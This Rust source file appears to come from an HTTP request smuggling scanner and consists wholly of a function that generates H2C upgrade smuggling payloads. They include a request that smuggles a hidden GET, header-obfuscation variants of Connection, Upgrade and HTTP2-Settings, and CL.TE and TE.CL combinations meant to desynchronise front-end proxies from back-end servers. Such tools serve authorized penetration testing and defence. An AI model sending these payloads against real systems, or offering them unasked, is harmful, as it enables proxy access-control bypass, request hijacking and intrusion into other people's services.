use super::{format_cookies, format_custom_headers};

/// Generate H2C (HTTP/2 Cleartext) smuggling attack payloads
/// H2C smuggling exploits discrepancies in how proxies handle HTTP/1.1 to HTTP/2 upgrade requests
/// Reference: https://bishopfox.com/blog/h2c-smuggling-request
pub fn get_h2c_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let mut payloads = Vec::with_capacity(16);

    // Basic H2C upgrade request
    // The front-end may not process the upgrade, but the back-end might
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with smuggled request (using Content-Length discrepancy)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 30\r\n\
         \r\n\
         GET /smuggled HTTP/1.1\r\n\
         Foo: x",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C upgrade with different Connection header variations
    let connection_variations = vec![
        "Connection: Upgrade, HTTP2-Settings, close",
        "Connection: Upgrade,HTTP2-Settings",
        "Connection: Upgrade, HTTP2-Settings, keep-alive",
        "Connection: HTTP2-Settings, Upgrade",
        "Connection: upgrade, http2-settings", // lowercase
        "Connection: UPGRADE, HTTP2-SETTINGS", // uppercase
    ];

    for conn_header in &connection_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             {}\r\n\
             Upgrade: h2c\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, conn_header
        ));
    }

    // Upgrade header variations
    let upgrade_variations = vec![
        "Upgrade: h2c",
        "Upgrade: H2C",           // uppercase
        "Upgrade: h2c, http/1.1", // multiple protocols
        "Upgrade: http/1.1, h2c", // reversed order
        " Upgrade: h2c",          // space prefix
        "Upgrade : h2c",          // space before colon
        "Upgrade:\th2c",          // tab after colon
    ];

    for upgrade_header in &upgrade_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             {}\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, upgrade_header
        ));
    }

    // HTTP2-Settings header variations (different base64 encoded SETTINGS frames)
    let http2_settings_variations = vec![
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",  // default
        "HTTP2-Settings: AAQAAP__",                  // minimal settings
        "HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAA",  // alternate settings
        "http2-settings: AAMAAABkAARAAAAAAAIAAAAA",  // lowercase
        "HTTP2-SETTINGS: AAMAAABkAARAAAAAAAIAAAAA",  // uppercase
        "HTTP2-Settings:AAMAAABkAARAAAAAAAIAAAAA",   // no space
        " HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // space prefix
    ];

    for settings_header in &http2_settings_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             {}\
             {}\
             Connection: Upgrade, HTTP2-Settings\r\n\
             Upgrade: h2c\r\n\
             {}\r\n\
             Content-Length: 0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, settings_header
        ));
    }

    // H2C with Transfer-Encoding (combining H2C with CL.TE techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         G",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with chunked encoding (combining H2C with TE.CL techniques)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Transfer-Encoding: chunked\r\n\
         Content-Length: 4\r\n\
         \r\n\
         1\r\n\
         A\r\n\
         0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // Double upgrade headers (upgrade obfuscation similar to TE.TE)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Upgrade: http/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    // H2C with different HTTP2-Settings positions (HTTP2-Settings before Host)
    payloads.push(format!(
        "{} {} HTTP/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Host: {}\r\n\
         {}\
         {}\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         Content-Length: 0\r\n\
         \r\n",
        method, path, host, custom_header_str, cookie_str
    ));

    payloads
}
